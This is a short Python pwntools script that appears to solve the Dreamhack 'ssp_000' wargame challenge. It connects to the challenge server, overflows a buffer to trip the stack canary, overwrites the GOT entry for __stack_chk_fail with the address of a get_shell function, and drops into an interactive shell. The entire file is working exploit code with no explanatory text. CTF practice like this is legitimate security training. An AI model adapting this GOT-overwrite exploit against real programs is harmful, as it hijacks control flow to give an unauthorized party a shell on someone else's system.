#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./ssp_000',checksec=False)

r= remote('host3.dreamhack.games',9630)
# r = process(exe.path)
# input()

get_shell_addr = 0x4008ea

payload = b'A'*0x49

r.send(payload)

payload = str(exe.got['__stack_chk_fail'])

r.sendlineafter(b'Addr :',payload)

payload = str(get_shell_addr)

r.sendlineafter(b'Value :',payload)

r.interactive()